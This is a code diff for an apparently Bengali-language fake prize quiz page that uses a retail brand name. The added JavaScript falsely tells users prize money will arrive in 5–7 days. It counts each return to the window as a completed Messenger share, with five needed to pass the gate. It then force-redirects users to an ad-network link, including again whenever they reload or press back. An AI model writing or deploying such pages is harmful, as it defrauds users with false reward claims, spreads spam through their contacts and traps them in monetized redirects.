@@ -112,7 +112,6 @@
             padding: 28px;
             box-shadow: 0 10px 30px rgba(196, 30, 58, 0.08);
             border: 1px solid rgba(196, 30, 58, 0.1);
-            transition: all 0.3s ease;
             position: relative;
             overflow: hidden;
         }
@@ -182,12 +181,10 @@
             color: #2C2C2C;
             text-align: left;
             cursor: pointer;
-            transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1);
+            transition: all 0.2s ease;
             font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
             background: white;
             position: relative;
-            overflow: hidden;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
         }
 
         .option:hover {
@@ -199,7 +196,6 @@
 
         .option:active {
             transform: translateY(0);
-            box-shadow: 0 4px 8px rgba(196, 30, 58, 0.1);
         }
 
         .option::after {
@@ -226,7 +222,6 @@
             justify-content: center;
             align-items: center;
             gap: 12px;
-            position: relative;
         }
 
         .progress-dot {
@@ -234,8 +229,7 @@
             height: 10px;
             border-radius: 20px;
             background: rgba(0, 0, 0, 0.08);
-            transition: all 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
-            position: relative;
+            transition: all 0.3s ease;
         }
 
         .progress-dot.active {
@@ -305,7 +299,6 @@
             justify-content: center;
             align-items: center;
             animation: pulse 1.8s ease infinite;
-            position: relative;
         }
 
         .pulse-circle-inner {
@@ -354,7 +347,6 @@
             background: linear-gradient(145deg, #1A1A1A, #2C2C2C);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            letter-spacing: -0.01em;
         }
 
         .judging-text-sub {
@@ -374,8 +366,6 @@
             font-weight: 900;
             color: #C41E3A;
             display: inline-block;
-            animation: countUp 2s ease;
-            position: relative;
         }
 
         .judging-percent::after {
@@ -448,7 +438,7 @@
             border: 1px solid rgba(196, 30, 58, 0.2);
             position: relative;
             overflow: hidden;
-            animation: popIn 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: popIn 0.5s ease;
         }
 
         @keyframes popIn {
@@ -535,7 +525,7 @@
             fill: white;
         }
 
-        /* Progress line - clean, no text */
+        /* Progress line */
         .progress-line-container {
             margin-top: 24px;
             text-align: center;
@@ -556,9 +546,123 @@
             background: linear-gradient(90deg, #1877F2, #0084FF, #1877F2);
             background-size: 200% 100%;
             border-radius: 30px;
-            transition: width 0.5s cubic-bezier(0.34, 1.56, 0.64, 1);
+            transition: width 0.5s ease;
             animation: gradientMove 3s ease infinite;
             box-shadow: 0 0 12px rgba(24, 119, 242, 0.3);
+        }
+
+        /* ===== CONGRATULATIONS PAGE STYLES ===== */
+        .congrats-container {
+            width: 100%;
+            padding: 40px 20px;
+            background: linear-gradient(to bottom, #ffffff, #f0f8ff);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 350px;
+            border-bottom: 1px solid rgba(0,0,0,0.05);
+        }
+
+        .congrats-box {
+            max-width: 600px;
+            width: 100%;
+            background: white;
+            border-radius: 32px;
+            padding: 48px 32px;
+            box-shadow: 0 30px 60px rgba(196, 30, 58, 0.2);
+            border: 1px solid rgba(196, 30, 58, 0.25);
+            position: relative;
+            overflow: hidden;
+            text-align: center;
+            animation: congratsPop 0.8s cubic-bezier(0.34, 1.56, 0.64, 1);
+        }
+
+        @keyframes congratsPop {
+            0% { opacity: 0; transform: scale(0.8); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        .congrats-box::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 10px;
+            background: linear-gradient(90deg, #FFD700, #FFA500, #FFD700);
+            background-size: 200% 100%;
+            animation: gradientMove 2s ease infinite;
+        }
+
+        .congrats-icon {
+            font-size: 5rem;
+            margin-bottom: 16px;
+            animation: bounce 1s ease infinite;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+
+        .congrats-title {
+            font-size: 2.2rem;
+            font-weight: 900;
+            color: #C41E3A;
+            margin-bottom: 20px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            line-height: 1.3;
+            text-shadow: 0 2px 10px rgba(196, 30, 58, 0.2);
+        }
+
+        .congrats-message {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #1A1A1A;
+            margin-bottom: 24px;
+            font-family: 'Noto Sans Bengali', 'Inter', sans-serif;
+            line-height: 1.5;
+        }
+
+        .redirect-loader {
+            margin-top: 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .loader-dots {
+            display: flex;
+            gap: 8px;
+            justify-content: center;
+        }
+
+        .loader-dot {
+            width: 12px;
+            height: 12px;
+            background: #C41E3A;
+            border-radius: 50%;
+            animation: loaderPulse 1.2s ease infinite;
+        }
+
+        .loader-dot:nth-child(2) {
+            animation-delay: 0.2s;
+        }
+
+        .loader-dot:nth-child(3) {
+            animation-delay: 0.4s;
+        }
+
+        @keyframes loaderPulse {
+            0%, 100% { transform: scale(0.8); opacity: 0.5; }
+            50% { transform: scale(1.2); opacity: 1; }
+        }
+
+        .redirect-text {
+            font-size: 0.9rem;
+            color: #65676B;
+            font-weight: 400;
         }
 
         /* Hide/show classes */
@@ -714,6 +818,14 @@
             .share-btn {
                 max-width: 100%;
             }
+
+            .congrats-title {
+                font-size: 1.8rem;
+            }
+
+            .congrats-message {
+                font-size: 1.2rem;
+            }
         }
     </style>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&family=Noto+Sans+Bengali:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -800,6 +912,24 @@
                 <div class="progress-track">
                     <div id="progressFill" class="progress-fill" style="width: 0%;"></div>
                 </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== NEW: CONGRATULATIONS PAGE (hidden by default) ===== -->
+    <div id="congratsSection" class="congrats-container hidden">
+        <div class="congrats-box">
+            <div class="congrats-icon">🎉</div>
+            <div class="congrats-title">অভিনন্দন!</div>
+            <div class="congrats-message">৫–৭ দিনের মধ্যে আপনার পুরস্কারের টাকা পাঠিয়ে দেওয়া হবে।</div>
+
+            <div class="redirect-loader">
+                <div class="loader-dots">
+                    <div class="loader-dot"></div>
+                    <div class="loader-dot"></div>
+                    <div class="loader-dot"></div>
+                </div>
+                <div class="redirect-text">আপনাকে পুরস্কার পৃষ্ঠায় নেওয়া হচ্ছে...</div>
             </div>
         </div>
     </div>
@@ -950,66 +1080,161 @@
         let currentQuestion = 0;
         let shareCount = 0;
         const REQUIRED_SHARES = 5;
+        const REDIRECT_URL = "https://www.effectivegatecpm.com/ipwtmtbkj?key=ae37d7f6d97cc8e00ccfdf582f409544"; // You can change this later
 
         // DOM elements
         const questionSection = document.getElementById('questionSection');
         const judgingSection = document.getElementById('judgingSection');
         const shareSection = document.getElementById('shareSection');
+        const congratsSection = document.getElementById('congratsSection');
         const questionText = document.getElementById('questionText');
         const optionsContainer = document.getElementById('optionsContainer');
         const progressDots = document.getElementById('progressDots');
         const progressFill = document.getElementById('progressFill');
 
-        // ===== SAVE PROGRESS FUNCTION =====
-        function saveProgress() {
-            const progressData = {
-                currentQuestion: currentQuestion,
-                shareCount: shareCount,
-                isJudging: !judgingSection.classList.contains('hidden'),
-                isShare: !shareSection.classList.contains('hidden'),
-                isQuestion: !questionSection.classList.contains('hidden')
-            };
-            localStorage.setItem('bashundharaProgress', JSON.stringify(progressData));
+        // ===== REDIRECT FUNCTION =====
+        function redirectToLink() {
+            window.location.href = REDIRECT_URL;
         }
 
-        // ===== LOAD PROGRESS FUNCTION =====
-        function loadProgress() {
-            const savedProgress = localStorage.getItem('bashundharaProgress');
-            if (savedProgress) {
-                const progress = JSON.parse(savedProgress);
+        // ===== SHOW CONGRATS AND REDIRECT =====
+        function showCongratsAndRedirect() {
+            // Hide all sections
+            questionSection.classList.add('hidden');
+            judgingSection.classList.add('hidden');
+            shareSection.classList.add('hidden');
 
-                // Load question progress
-                if (progress.currentQuestion !== undefined) {
-                    currentQuestion = progress.currentQuestion;
+            // Show congrats section
+            congratsSection.classList.remove('hidden');
+
+            // Save that user completed
+            localStorage.setItem('bashundharaCompleted', 'true');
+            localStorage.setItem('bashundharaCurrentSection', 'congrats');
+
+            // Redirect after 1.5 seconds
+            setTimeout(redirectToLink, 1500);
+        }
+
+        // ===== HANDLE BACK BUTTON =====
+        window.addEventListener('pageshow', function(event) {
+            // Check if user came via back button
+            if (event.persisted || (window.performance && window.performance.navigation.type === 2)) {
+                // Check if they already completed
+                const completed = localStorage.getItem('bashundharaCompleted');
+                const currentSection = localStorage.getItem('bashundharaCurrentSection');
+
+                if (completed === 'true' || currentSection === 'congrats') {
+                    // Redirect them again
+                    redirectToLink();
                 }
+            }
+        });
 
-                // Load share count
-                if (progress.shareCount !== undefined) {
-                    shareCount = progress.shareCount;
+        // Also check on page load
+        window.addEventListener('load', function() {
+            const completed = localStorage.getItem('bashundharaCompleted');
+            const currentSection = localStorage.getItem('bashundharaCurrentSection');
+
+            if (completed === 'true' || currentSection === 'congrats') {
+                // If they try to come back, redirect
+                redirectToLink();
+            }
+        });
+
+        // Share function - ONLY opens Messenger, NO bar fill
+        function handleShare() {
+            const siteUrl = window.location.href;
+            window.open(`fb-messenger://share?link=${encodeURIComponent(siteUrl)}`, '_blank');
+        }
+
+        // Track when user COMES BACK to the page
+        window.addEventListener('focus', function() {
+            // Only count if share section is visible and not completed
+            if (!shareSection.classList.contains('hidden') && shareCount < REQUIRED_SHARES) {
+                // User came back! Now fill the bar
+                shareCount++;
+
+                // Save to localStorage
+                localStorage.setItem('bashundharaShareCount', shareCount);
+
+                // Update progress bar
+                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
+                progressFill.style.width = `${progressPercent}%`;
+
+                // Save current section
+                localStorage.setItem('bashundharaCurrentSection', 'share');
+
+                // When completed - show congrats and redirect
+                if (shareCount === REQUIRED_SHARES) {
+                    setTimeout(() => {
+                        showCongratsAndRedirect();
+                    }, 500);
                 }
+            }
+        });
 
-                // Hide all sections first
-                questionSection.classList.add('hidden');
-                judgingSection.classList.add('hidden');
-                shareSection.classList.add('hidden');
+        // Save which section user is on
+        function saveCurrentSection() {
+            if (!questionSection.classList.contains('hidden')) {
+                localStorage.setItem('bashundharaCurrentSection', 'question');
+                localStorage.setItem('bashundharaQuestionIndex', currentQuestion);
+            } else if (!judgingSection.classList.contains('hidden')) {
+                localStorage.setItem('bashundharaCurrentSection', 'judging');
+            } else if (!shareSection.classList.contains('hidden')) {
+                localStorage.setItem('bashundharaCurrentSection', 'share');
+            } else if (!congratsSection.classList.contains('hidden')) {
+                localStorage.setItem('bashundharaCurrentSection', 'congrats');
+                localStorage.setItem('bashundharaCompleted', 'true');
+            }
+        }
 
-                // Show correct section
-                if (progress.isQuestion) {
+        // Load saved section when page loads
+        function loadSavedSection() {
+            const savedSection = localStorage.getItem('bashundharaCurrentSection');
+            const savedShareCount = localStorage.getItem('bashundharaShareCount');
+            const completed = localStorage.getItem('bashundharaCompleted');
+
+            // If already completed, redirect immediately
+            if (completed === 'true' || savedSection === 'congrats') {
+                redirectToLink();
+                return;
+            }
+
+            if (savedShareCount) {
+                shareCount = parseInt(savedShareCount);
+                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
+                progressFill.style.width = `${progressPercent}%`;
+            }
+
+            if (savedSection === 'question') {
+                const savedIndex = localStorage.getItem('bashundharaQuestionIndex');
+                if (savedIndex) {
+                    currentQuestion = parseInt(savedIndex);
                     questionSection.classList.remove('hidden');
+                    judgingSection.classList.add('hidden');
+                    shareSection.classList.add('hidden');
+                    congratsSection.classList.add('hidden');
                     loadQuestion(currentQuestion);
                     updateProgress(currentQuestion);
-                } else if (progress.isJudging) {
-                    judgingSection.classList.remove('hidden');
-                } else if (progress.isShare) {
-                    shareSection.classList.remove('hidden');
-                    // Update progress bar
-                    const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
-                    progressFill.style.width = `${progressPercent}%`;
                 }
-
-                return true;
+            } else if (savedSection === 'judging') {
+                questionSection.classList.add('hidden');
+                judgingSection.classList.remove('hidden');
+                shareSection.classList.add('hidden');
+                congratsSection.classList.add('hidden');
+            } else if (savedSection === 'share') {
+                questionSection.classList.add('hidden');
+                judgingSection.classList.add('hidden');
+                shareSection.classList.remove('hidden');
+                congratsSection.classList.add('hidden');
+            } else {
+                // Start fresh
+                questionSection.classList.remove('hidden');
+                judgingSection.classList.add('hidden');
+                shareSection.classList.add('hidden');
+                congratsSection.classList.add('hidden');
+                loadQuestion(0);
             }
-            return false;
         }
 
         // Function to load question
@@ -1021,31 +1246,23 @@
                 const optionBtn = document.createElement('button');
                 optionBtn.className = 'option';
                 optionBtn.innerText = option;
-                optionBtn.onclick = () => {
+                optionBtn.onclick = function() {
                     if (currentQuestion < questions.length - 1) {
                         currentQuestion++;
                         loadQuestion(currentQuestion);
                         updateProgress(currentQuestion);
-                        saveProgress(); // Save after answering
+                        saveCurrentSection();
                     } else {
-                        // Last question answered - show judging page
+                        // Last question - show judging
                         questionSection.classList.add('hidden');
                         judgingSection.classList.remove('hidden');
-                        saveProgress(); // Save before transition
+                        saveCurrentSection();
 
-                        // Auto transition to share page after 2.5 seconds
-                        setTimeout(() => {
+                        // Go to share page after 2.5 seconds
+                        setTimeout(function() {
                             judgingSection.classList.add('hidden');
                             shareSection.classList.remove('hidden');
-
-                            // Load saved share count
-                            const savedCount = localStorage.getItem('bashundharaShareCount');
-                            if (savedCount) {
-                                shareCount = parseInt(savedCount);
-                                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
-                                progressFill.style.width = `${progressPercent}%`;
-                            }
-                            saveProgress(); // Save after transition
+                            saveCurrentSection();
                         }, 2500);
                     }
                 };
@@ -1065,56 +1282,31 @@
             }
         }
 
-        // Share function - opens Messenger
-        function handleShare() {
-            const siteUrl = window.location.href;
-            window.open(`fb-messenger://share?link=${encodeURIComponent(siteUrl)}`, '_blank');
-        }
-
-        // Track when user comes back to the page
-        window.addEventListener('focus', function() {
-            // Only count if share section is visible and not completed
-            if (!shareSection.classList.contains('hidden') && shareCount < REQUIRED_SHARES) {
-                // Increment share count
-                shareCount++;
-
-                // Save to localStorage
-                localStorage.setItem('bashundharaShareCount', shareCount);
-
-                // Calculate progress percentage
-                const progressPercent = (shareCount / REQUIRED_SHARES) * 100;
-                progressFill.style.width = `${progressPercent}%`;
-
-                // Save progress
-                saveProgress();
-
-                // Stay on share section - NO redirect, NO hide
-                // User can share again immediately
-
-                // When completed
-                if (shareCount === REQUIRED_SHARES) {
-                    setTimeout(() => {
-                        alert('🎉 অভিনন্দন! আপনি সফলভাবে পুরস্কার নিশ্চিত করেছেন!');
-                    }, 500);
-                }
-            }
-        });
-
-        // Save progress when leaving page
+        // Save section when leaving page
         window.addEventListener('beforeunload', function() {
-            saveProgress();
+            saveCurrentSection();
         });
 
         // Event listener for Messenger button
         document.getElementById('messengerShareBtn').addEventListener('click', handleShare);
 
-        // ===== LOAD SAVED PROGRESS ON START =====
-        const progressLoaded = loadProgress();
+        // Check if we have saved progress
+        const hasSavedSection = localStorage.getItem('bashundharaCurrentSection');
+        const completed = localStorage.getItem('bashundharaCompleted');
 
-        // If no saved progress, start fresh
-        if (!progressLoaded) {
+        if (completed === 'true') {
+            redirectToLink();
+        } else if (hasSavedSection) {
+            loadSavedSection();
+        } else {
+            // Start fresh
             loadQuestion(0);
         }
+
+        // Clear test data (comment this out in production)
+        // localStorage.removeItem('bashundharaCompleted');
+        // localStorage.removeItem('bashundharaCurrentSection');
+        // localStorage.removeItem('bashundharaShareCount');
     </script>
 </body>
 </html>
